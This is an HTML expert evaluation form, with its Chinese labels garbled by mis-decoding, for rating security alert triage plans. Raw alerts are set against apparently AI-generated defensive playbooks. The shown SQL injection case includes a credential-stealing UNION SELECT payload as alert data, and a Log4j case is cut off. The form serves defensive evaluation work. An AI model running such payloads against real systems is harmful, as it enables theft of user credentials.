<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>æ™ºèƒ½å‘Šè­¦å¤„ç½®ç³»ç»Ÿ - ä¸“å®¶åœ¨çº¿è¯„åˆ†è¡¨</title>
    <style>
        * {
            box-sizing: border-box;
        }
        
        body {
            font-family: "Microsoft YaHei", "SimHei", sans-serif;
            font-size: 14px;
            line-height: 1.6;
            color: #333;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }
        
        .container {
            max-width: 1200px;
            margin: 0 auto;
            background: white;
            border-radius: 12px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.2);
            overflow: hidden;
        }
        
        .header {
            background: linear-gradient(135deg, #1a5f7a 0%, #159895 100%);
            color: white;
            padding: 30px;
            text-align: center;
        }
        
        .header h1 {
            margin: 0;
            font-size: 24px;
        }
        
        .header p {
            margin: 10px 0 0;
            opacity: 0.9;
        }
        
        .progress-bar {
            background: rgba(255,255,255,0.3);
            height: 8px;
            border-radius: 4px;
            margin-top: 20px;
            overflow: hidden;
        }
        
        .progress-fill {
            background: #4ade80;
            height: 100%;
            width: 0%;
            transition: width 0.3s;
            border-radius: 4px;
        }
        
        .progress-text {
            margin-top: 8px;
            font-size: 13px;
        }
        
        .expert-info {
            background: #f8fafc;
            padding: 25px 30px;
            border-bottom: 1px solid #e2e8f0;
        }
        
        .expert-info h3 {
            margin: 0 0 15px;
            color: #1a5f7a;
        }
        
        .form-row {
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
        }
        
        .form-group {
            flex: 1;
            min-width: 200px;
        }
        
        .form-group label {
            display: block;
            font-weight: bold;
            margin-bottom: 5px;
            color: #475569;
        }
        
        .form-group input, .form-group select {
            width: 100%;
            padding: 10px 12px;
            border: 2px solid #e2e8f0;
            border-radius: 8px;
            font-size: 14px;
            transition: border-color 0.2s;
        }
        
        .form-group input:focus, .form-group select:focus {
            outline: none;
            border-color: #1a5f7a;
        }
        
        .nav-tabs {
            display: flex;
            background: #f1f5f9;
            padding: 10px 10px 0;
            gap: 5px;
            overflow-x: auto;
        }
        
        .nav-tab {
            padding: 12px 20px;
            background: transparent;
            border: none;
            cursor: pointer;
            font-size: 13px;
            color: #64748b;
            border-radius: 8px 8px 0 0;
            transition: all 0.2s;
            white-space: nowrap;
        }
        
        .nav-tab:hover {
            background: rgba(255,255,255,0.5);
        }
        
        .nav-tab.active {
            background: white;
            color: #1a5f7a;
            font-weight: bold;
        }
        
        .nav-tab.completed {
            color: #16a34a;
        }
        
        .nav-tab.completed::after {
            content: " âœ“";
        }
        
        .case-panel {
            display: none;
            padding: 30px;
        }
        
        .case-panel.active {
            display: block;
        }
        
        .case-title {
            color: #1a5f7a;
            margin: 0 0 20px;
            padding-bottom: 10px;
            border-bottom: 2px solid #e2e8f0;
        }
        
        .alert-box {
            background: #fef3c7;
            border: 1px solid #f59e0b;
            border-left: 4px solid #f59e0b;
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 25px;
        }
        
        .alert-box h4 {
            margin: 0 0 10px;
            color: #92400e;
        }
        
        .alert-content {
            background: #1e293b;
            color: #e2e8f0;
            padding: 15px;
            border-radius: 8px;
            font-family: "Consolas", monospace;
            font-size: 12px;
            white-space: pre-wrap;
            max-height: 200px;
            overflow-y: auto;
        }
        
        /* æ–¹æ¡ˆAå’ŒBä¸¤åˆ—å¹¶æ’å¸ƒå±€ */
        .solutions-container {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 25px;
        }
        
        @media (max-width: 900px) {
            .solutions-container {
                grid-template-columns: 1fr;
            }
        }
        
        .solution-box {
            background: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 8px;
            overflow: hidden;
        }
        
        .solution-header {
            background: #e2e8f0;
            padding: 12px 15px;
            font-weight: bold;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .solution-header.plan-a {
            background: #fee2e2;
            color: #991b1b;
        }
        
        .solution-header.plan-b {
            background: #dbeafe;
            color: #1e40af;
        }
        
        .solution-content {
            padding: 15px;
            font-size: 13px;
            max-height: 350px;
            overflow-y: auto;
        }
        
        .solution-content pre {
            background: #f1f5f9;
            padding: 10px;
            border-radius: 6px;
            overflow-x: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
            margin: 0;
        }
        
        /* æ»‘å—è¯„åˆ†æ ·å¼ */
        .slider-container {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        
        .rating-slider {
            width: 120px;
            height: 8px;
            -webkit-appearance: none;
            appearance: none;
            background: linear-gradient(to right, #ef4444 0%, #eab308 50%, #22c55e 100%);
            border-radius: 4px;
            outline: none;
            cursor: pointer;
        }
        
        .rating-slider::-webkit-slider-thumb {
            -webkit-appearance: none;
            appearance: none;
            width: 20px;
            height: 20px;
            background: white;
            border: 3px solid #166534;
            border-radius: 50%;
            cursor: pointer;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
        }
        
        .rating-slider::-moz-range-thumb {
            width: 20px;
            height: 20px;
            background: white;
            border: 3px solid #166534;
            border-radius: 50%;
            cursor: pointer;
            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
        }
        
        .slider-value {
            min-width: 40px;
            text-align: center;
            font-weight: bold;
            font-size: 16px;
            color: #166534;
            background: #f0fdf4;
            padding: 4px 8px;
            border-radius: 4px;
            border: 1px solid #86efac;
        }
        
        .rating-section {
            background: #f0fdf4;
            border: 1px solid #86efac;
            border-radius: 8px;
            padding: 20px;
            margin-top: 25px;
        }
        
        .rating-section h4 {
            margin: 0 0 15px;
            color: #166534;
        }
        
        .rating-table {
            width: 100%;
            border-collapse: collapse;
        }
        
        .rating-table th, .rating-table td {
            padding: 12px;
            text-align: center;
            border: 1px solid #d1d5db;
        }
        
        .rating-table th {
            background: #166534;
            color: white;
        }
        
        .rating-table td:first-child {
            text-align: left;
            font-weight: bold;
            background: #f0fdf4;
        }
        
        .rating-select {
            width: 70px;
            padding: 8px;
            border: 2px solid #d1d5db;
            border-radius: 6px;
            font-size: 14px;
            cursor: pointer;
        }
        
        .rating-select:focus {
            border-color: #166534;
            outline: none;
        }
        
        .time-inputs {
            display: flex;
            gap: 20px;
            margin-top: 20px;
            flex-wrap: wrap;
        }
        
        .time-input {
            flex: 1;
            min-width: 150px;
        }
        
        .time-input label {
            display: block;
            font-size: 12px;
            color: #475569;
            margin-bottom: 5px;
        }
        
        .time-input input {
            width: 100%;
            padding: 10px;
            border: 2px solid #d1d5db;
            border-radius: 6px;
            font-size: 14px;
        }
        
        .judgment-section {
            margin-top: 20px;
            padding-top: 20px;
            border-top: 1px solid #d1d5db;
        }
        
        .radio-group {
            display: flex;
            gap: 20px;
            flex-wrap: wrap;
            margin-top: 10px;
        }
        
        .radio-option {
            display: flex;
            align-items: center;
            gap: 8px;
            cursor: pointer;
        }
        
        .radio-option input {
            width: 18px;
            height: 18px;
            cursor: pointer;
        }
        
        .comment-box {
            margin-top: 20px;
        }
        
        .comment-box textarea {
            width: 100%;
            height: 80px;
            padding: 12px;
            border: 2px solid #d1d5db;
            border-radius: 8px;
            font-size: 14px;
            resize: vertical;
        }
        
        .nav-buttons {
            display: flex;
            justify-content: space-between;
            margin-top: 30px;
            padding-top: 20px;
            border-top: 1px solid #e2e8f0;
        }
        
        .btn {
            padding: 12px 30px;
            border: none;
            border-radius: 8px;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .btn-secondary {
            background: #e2e8f0;
            color: #475569;
        }
        
        .btn-secondary:hover {
            background: #cbd5e1;
        }
        
        .btn-primary {
            background: linear-gradient(135deg, #1a5f7a 0%, #159895 100%);
            color: white;
        }
        
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(26,95,122,0.3);
        }
        
        .btn-success {
            background: linear-gradient(135deg, #16a34a 0%, #22c55e 100%);
            color: white;
        }
        
        .btn-success:hover {
            transform: translateY(-2px);
            box-shadow: 0 4px 12px rgba(22,163,74,0.3);
        }
        
        .export-section {
            background: #fef3c7;
            padding: 30px;
            text-align: center;
            display: none;
        }
        
        .export-section.show {
            display: block;
        }
        
        .export-section h3 {
            color: #92400e;
            margin: 0 0 15px;
        }
        
        .export-buttons {
            display: flex;
            gap: 15px;
            justify-content: center;
            flex-wrap: wrap;
        }
        
        .data-preview {
            background: #1e293b;
            color: #4ade80;
            padding: 15px;
            border-radius: 8px;
            text-align: left;
            font-family: monospace;
            font-size: 12px;
            max-height: 200px;
            overflow: auto;
            margin-top: 20px;
        }

        .tooltip {
            position: relative;
            cursor: help;
        }
        
        .tooltip::after {
            content: attr(data-tip);
            position: absolute;
            bottom: 100%;
            left: 50%;
            transform: translateX(-50%);
            background: #1e293b;
            color: white;
            padding: 8px 12px;
            border-radius: 6px;
            font-size: 12px;
            white-space: nowrap;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.2s;
        }
        
        .tooltip:hover::after {
            opacity: 1;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>ğŸ” æ™ºèƒ½å‘Šè­¦å¤„ç½®ç³»ç»Ÿ - ä¸“å®¶è¯„ä¼°</h1>
            <p>è¯·å¯¹æ¯”ä¸¤ä¸ªå¤„ç½®æ–¹æ¡ˆï¼Œç‹¬ç«‹å®Œæˆè¯„åˆ†</p>
            <div class="progress-bar">
                <div class="progress-fill" id="progressFill"></div>
            </div>
            <div class="progress-text">å®Œæˆè¿›åº¦: <span id="progressText">0/6</span></div>
        </div>
        
        <div class="expert-info">
            <h3>ğŸ“‹ ä¸“å®¶ä¿¡æ¯</h3>
            <div class="form-row">
                <div class="form-group">
                    <label>å§“å *</label>
                    <input type="text" id="expertName" placeholder="è¯·è¾“å…¥æ‚¨çš„å§“å" required>
                </div>
                <div class="form-group">
                    <label>èŒä½/èƒŒæ™¯ *</label>
                    <input type="text" id="expertRole" placeholder="å¦‚ï¼šå®‰å…¨åˆ†æå¸ˆã€SOCè¿è¥">
                </div>
                <div class="form-group">
                    <label>è¯„ä¼°æ—¥æœŸ</label>
                    <input type="date" id="evalDate" value="2025-12-04">
                </div>
            </div>
        </div>
        
        <div class="nav-tabs" id="navTabs">
            <button class="nav-tab" data-case="1" onclick="switchCase(1)">Case01_SQLæ³¨å…¥</button>
<button class="nav-tab" data-case="2" onclick="switchCase(2)">Case05_Log4j_RCE</button>
<button class="nav-tab" data-case="3" onclick="switchCase(3)">Case07_ç›®å½•éå†</button>
<button class="nav-tab" data-case="4" onclick="switchCase(4)">Case12_DirtyPipeææƒ</button>
<button class="nav-tab" data-case="5" onclick="switchCase(5)">Case17_æ¼æ´æ‰«æ</button>
<button class="nav-tab" data-case="6" onclick="switchCase(6)">Case20_å¼±å¯†ç </button>

        </div>
        
        
<div class="case-panel" id="case-1">
    <h2 class="case-title">ğŸ“‹ æ¡ˆä¾‹ #1: Case01_SQLæ³¨å…¥</h2>
    
    <div class="alert-box">
        <h4>ğŸš¨ åŸå§‹å‘Šè­¦ä¿¡æ¯</h4>
        <div class="alert-content">ã€å‘Šè­¦åç§°ã€‘SQLæ³¨å…¥æ”»å‡»æ£€æµ‹
ã€å‘Šè­¦æ—¶é—´ã€‘2025-12-04 10:15:00
ã€æ”»å‡»æºIPã€‘203.0.113.45
ã€ç›®æ ‡IPã€‘192.168.1.100
ã€ç›®æ ‡ç«¯å£ã€‘80
ã€å¨èƒç­‰çº§ã€‘é«˜å±
ã€æ”»å‡»ç±»å‹ã€‘SQLæ³¨å…¥
ã€æ¼æ´ç±»å‹ã€‘CVE-2024-21732
ã€ATT&amp;CKã€‘åˆå§‹è®¿é—®:TA0001|åˆ©ç”¨é¢å‘å…¬ä¼—çš„åº”ç”¨:T1190
ã€è¯·æ±‚URIã€‘/api/user/search?id=1
ã€Payloadã€‘id=1' UNION SELECT username,password,email FROM users--
ã€å‘Šè­¦æè¿°ã€‘æ£€æµ‹åˆ°æ¥è‡ª203.0.113.45çš„SQLæ³¨å…¥æ”»å‡»ï¼Œæ”»å‡»è€…å°è¯•é€šè¿‡è”åˆæŸ¥è¯¢è·å–ç”¨æˆ·è¡¨ä¸­çš„æ•æ„Ÿæ•°æ®ï¼ŒåŒ…æ‹¬ç”¨æˆ·åã€å¯†ç å’Œé‚®ç®±ä¿¡æ¯ã€‚
ã€å¤„ç½®å»ºè®®ã€‘å»ºè®®å°ç¦æ”»å‡»æºIPï¼Œä¿®å¤SQLæ³¨å…¥æ¼æ´ï¼Œå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œå‚æ•°åŒ–æŸ¥è¯¢</div>
    </div>
    
    <div class="solutions-container">
        <div class="solution-box">
            <div class="solution-header plan-a">ğŸ…°ï¸ æ–¹æ¡ˆA</div>
            <div class="solution-content"><pre>ã€å‘Šè­¦åç§°ã€‘SQLæ³¨å…¥æ”»å‡»æ£€æµ‹
ã€å‘Šè­¦æ—¶é—´ã€‘2025-12-04 10:15:00
ã€æ”»å‡»æºIPã€‘203.0.113.45
ã€ç›®æ ‡IPã€‘192.168.1.100
ã€ç›®æ ‡ç«¯å£ã€‘80
ã€å¨èƒç­‰çº§ã€‘é«˜å±
ã€æ”»å‡»ç±»å‹ã€‘SQLæ³¨å…¥
ã€æ¼æ´ç±»å‹ã€‘CVE-2024-21732
ã€ATT&amp;CKã€‘åˆå§‹è®¿é—®:TA0001|åˆ©ç”¨é¢å‘å…¬ä¼—çš„åº”ç”¨:T1190
ã€è¯·æ±‚URIã€‘/api/user/search?id=1
ã€Payloadã€‘id=1' UNION SELECT username,password,email FROM users--
ã€å‘Šè­¦æè¿°ã€‘æ£€æµ‹åˆ°æ¥è‡ª203.0.113.45çš„SQLæ³¨å…¥æ”»å‡»ï¼Œæ”»å‡»è€…å°è¯•é€šè¿‡è”åˆæŸ¥è¯¢è·å–ç”¨æˆ·è¡¨ä¸­çš„æ•æ„Ÿæ•°æ®ï¼ŒåŒ…æ‹¬ç”¨æˆ·åã€å¯†ç å’Œé‚®ç®±ä¿¡æ¯ã€‚
ã€å¤„ç½®å»ºè®®ã€‘å»ºè®®å°ç¦æ”»å‡»æºIPï¼Œä¿®å¤SQLæ³¨å…¥æ¼æ´ï¼Œå¯¹ç”¨æˆ·è¾“å…¥è¿›è¡Œå‚æ•°åŒ–æŸ¥è¯¢</pre></div>
        </div>
        
        <div class="solution-box">
            <div class="solution-header plan-b">ğŸ…±ï¸ æ–¹æ¡ˆB</div>
            <div class="solution-content"><pre>ã€å‘Šè­¦åˆ†ç±»ã€‘SQLæ³¨å…¥
ã€é£é™©ç­‰çº§ã€‘ğŸŸ¡ MEDIUMï¼ˆè¯„åˆ†ï¼š0.65ï¼‰
ã€å¤„ç½®å†³ç­–ã€‘ğŸ“‹ å·²åˆ›å»ºå·¥å•ï¼Œç­‰å¾…äººå·¥å®¡æ ¸

ã€äº‹ä»¶æè¿°ã€‘
åœ¨2025å¹´12æœˆ4æ—¥ä¸Šåˆ10:15ï¼Œæ£€æµ‹åˆ°ä¸€èµ·ä¸¥é‡çš„SQLæ³¨å…¥æ”»å‡»äº‹ä»¶ã€‚æ”»å‡»è€…æ¥è‡ªIPåœ°å€203.0.113.45ï¼Œç›®æ ‡æ˜¯ä½äº192.168.1.100çš„æœåŠ¡å™¨ï¼Œæ”»å‡»é€šè¿‡HTTPç«¯å£80è¿›è¡Œã€‚æ”»å‡»è€…åˆ©ç”¨CVE-2024-21732æ¼æ´ï¼Œé€šè¿‡è¯·æ±‚URI /api/user/search?id=1ï¼Œè¯•å›¾æ‰§è¡Œæ¶æ„SQLè¯­å¥ 'id=1' UNION SELECT username,password,email FROM users--'ï¼Œä»¥è·å–ç”¨æˆ·è¡¨ä¸­çš„æ•æ„Ÿä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·åã€å¯†ç å’Œé‚®ç®±ã€‚è¿™æ¬¡æ”»å‡»çš„å¨èƒç­‰çº§è¢«è¯„ä¼°ä¸ºé«˜å±ï¼Œå¯èƒ½å¯¼è‡´ä¸¥é‡çš„æ•°æ®æ³„éœ²ã€‚

ã€é£æ§è¯„ä¼°ã€‘
R=0.65(medium): åŠ¨ä½œ0.80+èŒƒå›´0.80+ä¸šåŠ¡0.29 -&gt; ticket
æœ¬æ¬¡å‘Šè­¦è¢«åˆ¤å®šä¸ºä¸­ç­‰é£é™©ï¼ˆç»¼åˆé£é™©è¯„åˆ†ï¼š0.65ï¼‰ã€‚å·²åˆ›å»ºå·¥å•ï¼Œéœ€è¦å®‰å…¨åˆ†æå¸ˆäººå·¥å®¡æ ¸åå†³å®šå¤„ç½®æ–¹æ¡ˆã€‚

ã€å¤„ç½®Playbookã€‘ç½®ä¿¡åº¦: 0.93

â–  å³æ—¶ç¼“è§£æªæ–½
1. å°ç¦æ”»å‡»æºIP [priority: critical]
   æè¿°: åœ¨é˜²ç«å¢™é˜»æ–­203.0.113.45çš„æ‰€æœ‰å…¥ç«™æµé‡ï¼Œé˜²æ­¢æŒç»­æ”»å‡»
   æ‰§è¡Œå‘½ä»¤(Linux): iptables -I INPUT -s 203.0.113.45 -j DROP
   æ‰§è¡Œå‘½ä»¤(Windows): netsh advfirewall firewall add rule name="Block_203.0.113.45" dir=in action=block remoteip=203.0.113.45
   å›é€€å‘½ä»¤(Linux): iptables -D INPUT -s 203.0.113.45 -j DROP
   å›é€€å‘½ä»¤(Windows): netsh advfirewall firewall delete rule name="Block_203.0.113.45"
   Pre-check: ç¡®è®¤203.0.113.45ä¸æ˜¯å†…éƒ¨åˆæ³•ä¸šåŠ¡ç³»ç»Ÿæˆ–ç®¡ç†ç»ˆç«¯IP

2. ç´§æ€¥éš”ç¦»WebæœåŠ¡ç«¯å£ [priority: high]
   æè¿°: ä¸´æ—¶å…³é—­80ç«¯å£é˜²æ­¢è¿›ä¸€æ­¥SQLæ³¨å…¥æ”»å‡»ï¼Œé€‚ç”¨äºå¤§è§„æ¨¡å…¥ä¾µæˆ–æ•°æ®æ³„éœ²é£é™©æé«˜æ—¶
   æ‰§è¡Œå‘½ä»¤(Linux): iptables -I INPUT -p tcp --dport 80 -j DROP
   æ‰§è¡Œå‘½ä»¤(Windows): netsh advfirewall firewall add rule name="Block_HTTP_80" dir=in action=block protocol=TCP localport=80
   å›é€€å‘½ä»¤(Linux): iptables -D INPUT -p tcp --dport 80 -j DROP
   å›é€€å‘½ä»¤(Windows): netsh advfirewall firewall delete rule name="Block_HTTP_80"
   Pre-check: ç¡®è®¤ä¸šåŠ¡å…è®¸çŸ­æ—¶ä¸­æ–­WebæœåŠ¡ï¼Œé€šçŸ¥ç›¸å…³ä¸šåŠ¡æ–¹

â–  æ ¹å› ä¿®å¤æ–¹æ¡ˆ
1. ä¿®å¤SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2024-21732ï¼‰[priority: critical]
   æè¿°: å‡çº§Webåº”ç”¨åˆ°å®˜æ–¹å·²ä¿®å¤CVE-2024-21732çš„æœ€æ–°ç‰ˆæœ¬ï¼Œæˆ–åº”ç”¨å‚å•†å®‰å…¨è¡¥ä¸
   æ‰§è¡Œå‘½ä»¤(Linux): cd /var/www/app &amp;&amp; git pull origin master
   å›é€€å‘½ä»¤(Linux): cd /var/www/app &amp;&amp; git reset --hard HEAD~1
   Pre-check: åœ¨æµ‹è¯•ç¯å¢ƒéªŒè¯å‡çº§å…¼å®¹æ€§ï¼Œå¤‡ä»½å½“å‰Webåº”ç”¨ç›®å½•å’Œæ•°æ®åº“

2. ä¿®æ­£åç«¯SQLæŸ¥è¯¢ä¸ºå‚æ•°åŒ–æŸ¥è¯¢ [priority: high]
   æè¿°: å°†åç«¯æ‰€æœ‰æ¶‰åŠç”¨æˆ·è¾“å…¥çš„SQLæŸ¥è¯¢é‡æ„ä¸ºå‚æ•°åŒ–æŸ¥è¯¢ï¼Œé˜²æ­¢æ³¨å…¥
   æ‰§è¡Œå‘½ä»¤(Linux): grep -r --include=*.php 'SELECT.*\$_GET' /var/www/app | tee /tmp/suspect_sql.txt
   Pre-check: ç¡®ä¿å·²å®Œæ•´å¤‡ä»½åº”ç”¨ä»£ç ï¼Œä¿®æ­£ååœ¨æµ‹è¯•ç¯å¢ƒå›å½’æµ‹è¯•

â–  é¢„é˜²åŠ å›ºæªæ–½
1. éƒ¨ç½²Webåº”ç”¨é˜²ç«å¢™ï¼ˆWAFï¼‰[priority: high]
   æè¿°: åœ¨WebæœåŠ¡å™¨å‰ç«¯éƒ¨ç½²WAFï¼Œè‡ªåŠ¨æ‹¦æˆªSQLæ³¨å…¥ç­‰å¸¸è§Webæ”»å‡»
   æ‰§è¡Œå‘½ä»¤(Linux): apt-get install libapache2-mod-security2 &amp;&amp; a2enmod security2 &amp;&amp; systemctl reload apache2
   å›é€€å‘½ä»¤(Linux): a2dismod security2 &amp;&amp; systemctl reload apache2
   Pre-check: ç¡®è®¤WAFè§„åˆ™ä¸ä¼šè¯¯æ‹¦åˆæ³•ä¸šåŠ¡æµé‡ï¼Œå…ˆåœ¨æµ‹è¯•ç¯å¢ƒæ¨¡æ‹Ÿæ”»å‡»éªŒè¯

2. é™åˆ¶HTTPæ¥å£è®¿é—®æ¥æº [priority: medium]
   æè¿°: ä»…å…è®¸å¯ä¿¡æºIPè®¿é—®æ•æ„ŸAPIæ¥å£ï¼Œå‡å°‘æš´éœ²é¢
   æ‰§è¡Œå‘½ä»¤(Linux): iptables -A INPUT -p tcp -s 10.0.0.0/8 --dport 80 -j ACCEPT &amp;&amp; iptables -A INPUT -p tcp --dport 80 -j DROP
   Pre-check: ç¡®è®¤å…è®¸çš„IPèŒƒå›´è¦†ç›–æ‰€æœ‰åˆæ³•è®¿é—®ç”¨æˆ·å’Œç®¡ç†ç»ˆç«¯

3. åŠ å¼ºæ•°æ®åº“è´¦æˆ·æƒé™æœ€å°åŒ– [priority: medium]
   æè¿°: ç¡®ä¿Webåº”ç”¨æ•°æ®åº“è´¦æˆ·ä»…æœ‰å¿…è¦çš„æœ€å°æƒé™ï¼Œé˜²æ­¢æ”»å‡»è€…åˆ©ç”¨æ³¨å…¥è¿›ä¸€æ­¥æ¨ªå‘æ‰©å±•
   æ‰§è¡Œå‘½ä»¤: mysql -u root -p -e "REVOKE ALL PRIVILEGES, GRANT OPTION FROM 'webuser'@'localhost'; GRANT SELECT,INSERT,UPDATE,DELETE ON dbname.* TO 'webuser'@'localhost';"
   Pre-check: ç¡®è®¤webuserè´¦æˆ·ä¸æ‰¿æ‹…å…¶ä»–é«˜æƒé™ä¸šåŠ¡ï¼Œå˜æ›´å‰å¤‡ä»½æ•°æ®åº“æƒé™è¡¨</pre></div>
        </div>
    </div>
    
    <div class="rating-section">
        <h4>ğŸ“Š è¯„åˆ†ï¼ˆ1.0-5.0åˆ†ï¼Œ5åˆ†æœ€é«˜ï¼Œæ”¯æŒå°æ•°å¦‚4.9ï¼‰</h4>
        <table class="rating-table">
            <thead>
                <tr>
                    <th>è¯„ä¼°ç»´åº¦</th>
                    <th>æ–¹æ¡ˆA</th>
                    <th>æ–¹æ¡ˆB</th>
                </tr>
            </thead>
            <tbody>
                <tr>
                    <td class="tooltip" data-tip="ç²¾å‡†è¯†åˆ«æ”»å‡»ç±»å‹ï¼Œå®ä½“æå–æ— è¯¯">æ„å›¾ç†è§£ (25%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_intent" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_intent" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="CVE+ATT&CK+IOCå®Œæ•´å…³è”">è¯æ®é“¾å®Œæ•´æ€§ (25%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_evidence" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_evidence" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="å…·ä½“å‘½ä»¤å¯ç›´æ¥æ‰§è¡Œ">Playbookå¯æ‰§è¡Œæ€§ (30%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_playbook" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_playbook" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
                <tr>
                    <td class="tooltip" data-tip="æœ‰å›é€€å‘½ä»¤å’Œæ‰§è¡Œå‰æ£€æŸ¥">ä¸šåŠ¡å®‰å…¨æ€§ (20%)</td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planA_safety" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                    <td><div class="slider-container"><input type="range" class="rating-slider" name="planB_safety" min="1" max="5" step="0.1" value="3" oninput="this.nextElementSibling.textContent=this.value"><span class="slider-value">3.0</span></div></td>
                </tr>
            </tbody>
        </table>
        
        <div class="time-inputs">
            <div class="time-input">
                <label>å®Œå…¨äººå·¥å¤„ç†é¢„è®¡è€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="manualTime" min="1" max="120" placeholder="å¦‚ï¼š15">
            </div>
            <div class="time-input">
                <label>å®¡æ ¸æ–¹æ¡ˆAè€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="reviewA" min="1" max="60" placeholder="å¦‚ï¼š8">
            </div>
            <div class="time-input">
                <label>å®¡æ ¸æ–¹æ¡ˆBè€—æ—¶ï¼ˆåˆ†é’Ÿï¼‰</label>
                <input type="number" name="reviewB" min="1" max="60" placeholder="å¦‚ï¼š3">
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>å“ªä¸ªæ–¹æ¡ˆæ›´å¥½ï¼Ÿ</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="better" value="A"> æ–¹æ¡ˆAæ›´å¥½</label>
                <label class="radio-option"><input type="radio" name="better" value="B"> æ–¹æ¡ˆBæ›´å¥½</label>
                <label class="radio-option"><input type="radio" name="better" value="equal"> å·®ä¸å¤š</label>
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>æ–¹æ¡ˆAå¯é‡‡çº³ç¨‹åº¦ï¼š</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="adoptA" value="direct"> å¯ç›´æ¥é‡‡çº³</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="minor"> éœ€å°‘é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="major"> éœ€å¤§é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptA" value="unusable"> ä¸å¯ç”¨</label>
            </div>
        </div>
        
        <div class="judgment-section">
            <label><strong>æ–¹æ¡ˆBå¯é‡‡çº³ç¨‹åº¦ï¼š</strong></label>
            <div class="radio-group">
                <label class="radio-option"><input type="radio" name="adoptB" value="direct"> å¯ç›´æ¥é‡‡çº³</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="minor"> éœ€å°‘é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="major"> éœ€å¤§é‡ä¿®æ”¹</label>
                <label class="radio-option"><input type="radio" name="adoptB" value="unusable"> ä¸å¯ç”¨</label>
            </div>
        </div>
        
        <div class="comment-box">
            <label><strong>æ–¹æ¡ˆAè¯„ä»·ï¼ˆå¯é€‰ï¼‰ï¼š</strong></label>
            <textarea name="commentA" placeholder="ä¼˜ç‚¹/ç¼ºç‚¹/æ”¹è¿›å»ºè®®..."></textarea>
        </div>
        
        <div class="comment-box">
            <label><strong>æ–¹æ¡ˆBè¯„ä»·ï¼ˆå¯é€‰ï¼‰ï¼š</strong></label>
            <textarea name="commentB" placeholder="ä¼˜ç‚¹/ç¼ºç‚¹/æ”¹è¿›å»ºè®®..."></textarea>
        </div>
    </div>
    
    <div class="nav-buttons">
        <button class="btn btn-secondary" onclick="prevCase(1)" disabled style="opacity:0.5">â† ä¸Šä¸€ä¸ª</button>
        <button class="btn btn-primary" onclick="nextCase(1)">ä¸‹ä¸€ä¸ª â†’</button>
    </div>
</div>

<div class="case-panel" id="case-2">
    <h2 class="case-title">ğŸ“‹ æ¡ˆä¾‹ #2: Case05_Log4j_RCE</h2>
    
    <div class="alert-box">
        <h4>ğŸš¨ åŸå§‹å‘Šè­¦ä¿¡æ¯</h4>
        <div class="alert-content">ã€å‘Šè­¦åç§°ã€‘Log4jè¿œç¨‹ä»£ç æ‰§è¡Œæ”»å‡»
ã€å‘Šè­¦æ—¶é—´ã€‘2025-12-04 12:00:00
ã€æ”»å‡»æºIPã€‘45.33.32.156
ã€ç›®æ ‡IPã€‘10.0.0.50
ã€ç›®æ ‡ç«¯å£ã€‘8080
ã€å¨èƒç­‰çº§ã€‘ä¸¥é‡
ã€æ”»å‡»ç±»å‹ã€‘å‘½ä»¤æ‰§è¡Œ/RCE
ã€æ¼æ´ç±»å‹ã€‘CVE-2021-44228
ã€ATT&amp;CKã€‘æ‰§è¡Œ:TA0002|åˆ©ç”¨åº”ç”¨ç¨‹åºæ¼æ´:T1203
